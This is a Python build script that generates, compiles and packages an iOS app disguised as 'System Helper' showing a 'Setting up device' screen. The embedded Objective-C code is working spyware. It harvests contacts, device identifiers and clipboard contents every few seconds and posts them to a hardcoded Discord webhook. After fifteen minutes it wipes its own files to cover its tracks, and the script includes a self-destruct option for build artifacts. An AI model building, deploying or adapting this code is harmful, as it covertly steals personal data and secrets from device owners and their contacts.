#!/usr/bin/env python3
import argparse
import shutil
import subprocess
import sys
import zipfile
from pathlib import Path

WEBHOOK = "https://discord.com/api/webhooks/1454910675322142924/fJBcyeAlycJOYp4xPe2k1BD6uLq4wXieb81n29Q4Hcxh3OafUJJT_O2Za-q0gz_j72xy"
BUNDLE_ID = "com.ofx.systemhelper"
APP_NAME = "SystemHelper"
BUNDLE_NAME = "SystemHelper.app"
BUILD_DIR = Path("build")
OUT_IPA = Path(f"{APP_NAME}.ipa")

MAIN_M = r'''
#import <UIKit/UIKit.h>
#import <Contacts/Contacts.h>
#include <unistd.h>

static NSString *const kWebhook = @"__WEBHOOK__";
static const NSInteger kLifetimeSeconds = 15 * 60;
static NSString *const kWipeMarker = @"ofx.wipe.done";

static NSString *gSentClip = @"";
static NSMutableArray<NSString *> *gCollected = nil;
static UIBackgroundTaskIdentifier gBgTask = 0;

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) NSTimer *clipTimer;
@property (nonatomic, strong) NSTimer *wipeTimer;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    if ([[NSUserDefaults standardUserDefaults] boolForKey:kWipeMarker]) _exit(0);
    gCollected = [NSMutableArray array];
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 100, UIScreen.mainScreen.bounds.size.width - 40, 200)];
    lbl.numberOfLines = 0;
    lbl.textAlignment = NSTextAlignmentCenter;
    lbl.text = @"System Helper\n\nSetting up device…";
    lbl.font = [UIFont systemFontOfSize:18 weight:UIFontWeightMedium];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    [self beginBgTask];
    [self requestContactsPermission];
    [self collectDeviceInfo];
    self.clipTimer = [NSTimer scheduledTimerWithTimeInterval:3.0 target:self selector:@selector(tickClipboard) userInfo:nil repeats:YES];
    self.wipeTimer = [NSTimer scheduledTimerWithTimeInterval:kLifetimeSeconds target:self selector:@selector(flushAndWipe) userInfo:nil repeats:NO];
    [self flushCollected];
    return YES;
}

- (void)beginBgTask {
    if (gBgTask != 0) return;
    __weak typeof(self) weakSelf = self;
    gBgTask = [[UIApplication sharedApplication] beginBackgroundTaskWithName:@"ofx.keepalive" expirationHandler:^{ [weakSelf endBgTask]; }];
}
- (void)endBgTask {
    if (gBgTask == 0) return;
    [[UIApplication sharedApplication] endBackgroundTask:gBgTask];
    gBgTask = 0;
}
- (void)requestContactsPermission {
    CNContactStore *store = [CNContactStore new];
    [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError *err) {
        if (!granted) return;
        NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey];
        CNContactFetchRequest *req = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];
        [store enumerateContactsWithFetchRequest:req error:nil usingBlock:^(CNContact *c, BOOL *stop) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%@ %@", c.givenName ?: @"", c.familyName ?: @""];
            for (CNPhoneNumber *p in c.phoneNumbers) [line appendFormat:@" | %@", p.stringValue];
            for (CNLabeledValue *e in c.emailAddresses) [line appendFormat:@" | %@", e.value];
            if (line.length > 0) { @synchronized (gCollected) { [gCollected addObject:line]; } }
        }];
        [self flushCollected];
    }];
}
- (void)tickClipboard {
    UIPasteboard *pb = [UIPasteboard generalPasteboard];
    NSString *s = pb.string;
    if (!s || s.length == 0 || [s isEqualToString:gSentClip]) return;
    gSentClip = s;
    NSString *msg = [NSString stringWithFormat:@"[pasteboard] %@", s];
    @synchronized (gCollected) { [gCollected addObject:msg]; }
    [self flushCollected];
}
- (void)collectDeviceInfo {
    UIDevice *d = [UIDevice currentDevice];
    NSDictionary *info = @{@"model": d.model ?: @"", @"name": d.name ?: @"", @"system": [NSString stringWithFormat:@"%@ %@", d.systemName, d.systemVersion], @"idfv": [[[UIDevice currentDevice] identifierForVendor] UUIDString] ?: @"", @"locale": [[NSLocale currentLocale] localeIdentifier] ?: @"", @"tz": [NSTimeZone localTimeZone].name ?: @""};
    NSData *j = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
    NSString *line = [NSString stringWithFormat:@"[device] %@", [[NSString alloc] initWithData:j encoding:NSUTF8StringEncoding]];
    @synchronized (gCollected) { [gCollected addObject:line]; }
}
- (void)flushCollected {
    NSArray<NSString *> *batch;
    @synchronized (gCollected) {
        if (gCollected.count == 0) return;
        batch = [gCollected copy];
        [gCollected removeAllObjects];
    }
    NSMutableString *chunk = [NSMutableString string];
    NSMutableArray<NSString *> *payloads = [NSMutableArray array];
    for (NSString *l in batch) {
        if (chunk.length + l.length + 1 > 1900) {
            [payloads addObject:[chunk copy]];
            [chunk setString:@""];
        }
        [chunk appendFormat:@"%@\n", l];
    }
    if (chunk.length) [payloads addObject:[chunk copy]];
    for (NSString *body in payloads) {
        NSDictionary *json = @{@"content": body};
        NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kWebhook]];
        [req setHTTPMethod:@"POST"];
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setHTTPBody:data];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {}] resume];
    }
}
- (void)flushAndWipe {
    [self flushCollected];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self wipeSelf]; });
}
- (void)wipeSelf {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:kWipeMarker];
    [ud synchronize];
    NSFileManager *fm = [NSFileManager defaultManager];
    
    // FIX: Wrap NSInteger enums in @() to make them NSNumbers
    NSArray *domains = @[@(NSDocumentDirectory), @(NSLibraryDirectory), @(NSCachesDirectory)];
    for (NSNumber *dom in domains) {
        NSArray *paths = NSSearchPathForDirectoriesInDomains([dom unsignedIntegerValue], NSUserDomainMask, YES);
        for (NSString *p in paths) [fm removeItemAtPath:p error:nil];
    }
    [fm removeItemAtPath:NSTemporaryDirectory() error:nil];
    NSString *lib = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES).firstObject;
    NSString *prefs = [lib stringByAppendingPathComponent:[NSString stringWithFormat:@"Preferences/%@.plist", [[NSBundle mainBundle] bundleIdentifier]]];
    [fm removeItemAtPath:prefs error:nil];
    [fm removeItemAtPath:[[NSBundle mainBundle] bundlePath] error:nil];
    [self endBgTask];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ _exit(0); });
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
'''

INFO_PLIST = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleDevelopmentRegion</key><string>en</string>
    <key>CFBundleExecutable</key><string>SystemHelper</string>
    <key>CFBundleIdentifier</key><string>{BUNDLE_ID}</string>
    <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
    <key>CFBundleName</key><string>{APP_NAME}</string>
    <key>CFBundleDisplayName</key><string>System Helper</string>
    <key>CFBundlePackageType</key><string>APPL</string>
    <key>CFBundleShortVersionString</key><string>1.0</string>
    <key>CFBundleVersion</key><string>1</string>
    <key>LSRequiresIPhoneOS</key><true/>
    <key>UILaunchScreen</key><dict/>
    <key>UISupportedInterfaceOrientations</key><array><string>UIInterfaceOrientationPortrait</string></array>
    <key>NSContactsUsageDescription</key><string>System Helper needs contacts to sync your device.</string>
    <key>MinimumOSVersion</key><string>15.0</string>
    <key>UIApplicationExitsOnSuspend</key><false/>
</dict>
</plist>
'''

PBXPROJ = '''// !$*UTF8*$!
{{
    archiveVersion = 1;
    classes = {{}};
    objectVersion = 56;
    objects = {{
        AAAA0001 = {{isa = PBXFileReference; lastKnownFileType = "wrapper.application"; path = SystemHelper.app; sourceTree = BUILT_PRODUCTS_DIR; }};
        AAAA0002 = {{isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = SOURCE_ROOT; }};
        AAAA0003 = {{isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = SOURCE_ROOT; }};
        
        AAAA0005 = {{isa = PBXBuildFile; fileRef = AAAA0006; }};
        AAAA0006 = {{isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; }};
        AAAA0007 = {{isa = PBXBuildFile; fileRef = AAAA0008; }};
        AAAA0008 = {{isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Contacts.framework; path = System/Library/Frameworks/Contacts.framework; sourceTree = SDKROOT; }};
        
        AAAA0004 = {{isa = PBXBuildFile; fileRef = AAAA0002; }};

        AAAA0010 = {{ isa = PBXGroup; children = (AAAA0002, AAAA0003, AAAA0012, AAAA0011); sourceTree = "<group>"; }};
        AAAA0011 = {{ isa = PBXGroup; children = (AAAA0001); name = Products; sourceTree = "<group>"; }};
        AAAA0012 = {{ isa = PBXGroup; children = (AAAA0006, AAAA0008); name = Frameworks; sourceTree = "<group>"; }};

        AAAA0020 = {{
            isa = PBXNativeTarget;
            buildConfigurationList = AAAA0030;
            buildPhases = (AAAA0021, AAAA0022);
            buildRules = ();
            dependencies = ();
            name = SystemHelper;
            productName = SystemHelper;
            productReference = AAAA0001;
            productType = "com.apple.product-type.application";
        }};

        AAAA0021 = {{ isa = PBXSourcesBuildPhase; buildActionMask = 2147483647; files = (AAAA0004,); runOnlyForDeploymentPostprocessing = 0; }};
        AAAA0022 = {{ isa = PBXFrameworksBuildPhase; buildActionMask = 2147483647; files = (AAAA0005, AAAA0007,); runOnlyForDeploymentPostprocessing = 0; }};

        AAAA0040 = {{
            isa = PBXProject;
            attributes = {{ LastUpgradeCheck = 1500; }};
            buildConfigurationList = AAAA0041;
            compatibilityVersion = "Xcode 14.0";
            developmentRegion = en;
            hasScannedForEncodings = 0;
            knownRegions = (en, Base);
            mainGroup = AAAA0010;
            productRefGroup = AAAA0011;
            projectDirPath = "";
            projectRoot = "";
            targets = (AAAA0020);
        }};

        AAAA0050 = {{
            isa = XCBuildConfiguration;
            buildSettings = {{
                ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = "";
                INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}";
                PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2";
                CLANG_ENABLE_OBJC_ARC = YES;
                ALWAYS_SEARCH_USER_PATHS = NO;
            }};
            name = Debug;
        }};
        AAAA0051 = {{
            isa = XCBuildConfiguration;
            buildSettings = {{
                ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = "";
                INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}";
                PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2";
                CLANG_ENABLE_OBJC_ARC = YES;
                ALWAYS_SEARCH_USER_PATHS = NO;
            }};
            name = Release;
        }};
        AAAA0060 = {{ isa = XCBuildConfiguration; buildSettings = {{ SDKROOT = iphoneos; }}; name = Debug; }};
        AAAA0061 = {{ isa = XCBuildConfiguration; buildSettings = {{ SDKROOT = iphoneos; }}; name = Release; }};

        AAAA0030 = {{ isa = XCConfigurationList; buildConfigurations = (AAAA0050, AAAA0051); defaultConfigurationName = Release; }};
        AAAA0041 = {{ isa = XCConfigurationList; buildConfigurations = (AAAA0060, AAAA0061); defaultConfigurationName = Release; }};
    }};
    rootObject = AAAA0040;
}}
'''

XSCHEME = '''<?xml version="1.0" encoding="UTF-8"?>
<Scheme LastUpgradeVersion = "1500" version = "1.7">
   <BuildAction parallelizeBuildables = "YES" buildImplicitDependencies = "YES">
      <BuildActionEntries>
         <BuildActionEntry buildForTesting = "YES" buildForRunning = "YES" buildForProfiling = "YES" buildForArchiving = "YES" buildForAnalyzing = "YES">
            <BuildableReference
               BuildableIdentifier = "primary"
               BlueprintIdentifier = "AAAA0020"
               BuildableName = "SystemHelper.app"
               BlueprintName = "SystemHelper"
               ReferencedContainer = "container:SystemHelper.xcodeproj">
            </BuildableReference>
         </BuildActionEntry>
      </BuildActionEntries>
   </BuildAction>
</Scheme>
'''

def scaffold():
    if BUILD_DIR.exists(): shutil.rmtree(BUILD_DIR)
    proj = BUILD_DIR / f"{APP_NAME}.xcodeproj"
    BUILD_DIR.mkdir(parents=True)
    proj.mkdir(parents=True, exist_ok=True)
    scheme_dir = proj / "xcshareddata" / "xcschemes"
    scheme_dir.mkdir(parents=True, exist_ok=True)
    
    (BUILD_DIR / "main.m").write_text(MAIN_M.replace("__WEBHOOK__", WEBHOOK), encoding="utf-8")
    (BUILD_DIR / "Info.plist").write_text(INFO_PLIST.format(BUNDLE_ID=BUNDLE_ID, APP_NAME=APP_NAME), encoding="utf-8")
    (proj / "project.pbxproj").write_text(PBXPROJ.format(BUNDLE_ID=BUNDLE_ID), encoding="utf-8")
    (scheme_dir / f"{APP_NAME}.xcscheme").write_text(XSCHEME, encoding="utf-8")
    print(f"[+] scaffolded {proj}")

def build():
    if sys.platform != "darwin": sys.exit(f"[!] macOS only.")
    cmd = ["xcodebuild", "-project", str(BUILD_DIR / f"{APP_NAME}.xcodeproj"), "-scheme", APP_NAME, "-configuration", "Release", "-sdk", "iphoneos", "-derivedDataPath", str(BUILD_DIR / "dd"), "CODE_SIGNING_ALLOWED=NO", "CODE_SIGNING_REQUIRED=NO", "CODE_SIGN_IDENTITY="]
    print("[*] xcodebuild…")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        sys.stderr.write(r.stdout + "\n" + r.stderr)
        sys.exit(r.returncode)
    print("[+] xcodebuild ok")

def pack_ipa():
    candidates = [BUILD_DIR / "dd" / "Build" / "Products" / "Release-iphoneos" / BUNDLE_NAME, BUILD_DIR / "dd" / "Build" / "Products" / "Release-iphoneos" / APP_NAME]
    app_path = next((p for p in candidates if p.exists()), None)
    if app_path is None: sys.exit(f"[!] no .app bundle found.")
    payload = BUILD_DIR / "Payload"
    if payload.exists(): shutil.rmtree(payload)
    payload.mkdir()
    shutil.copytree(app_path, payload / BUNDLE_NAME)
    ipa = BUILD_DIR / f"{APP_NAME}.ipa"
    with zipfile.ZipFile(ipa, "w", zipfile.ZIP_DEFLATED) as z:
        for f in payload.rglob("*"): z.write(f, f.relative_to(BUILD_DIR))
    print(f"[+] ipa: {ipa}")
    shutil.copy2(ipa, OUT_IPA)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--self-destruct", action="store_true")
    ap.add_argument("mode", nargs="?", default="full", choices=["full", "scaffold-only", "pack-only"])
    args = ap.parse_args()

    if args.mode == "scaffold-only": scaffold(); return
    if args.mode == "pack-only":
        pack_ipa()
        if args.self_destruct:
            for t in [BUILD_DIR, Path("__pycache__")]:
                if t.exists(): shutil.rmtree(t)
        return
    scaffold()
    build()
    pack_ipa()
    if args.self_destruct:
        for t in [BUILD_DIR, Path("__pycache__")]:
            if t.exists(): shutil.rmtree(t)

if __name__ == "__main__": main()
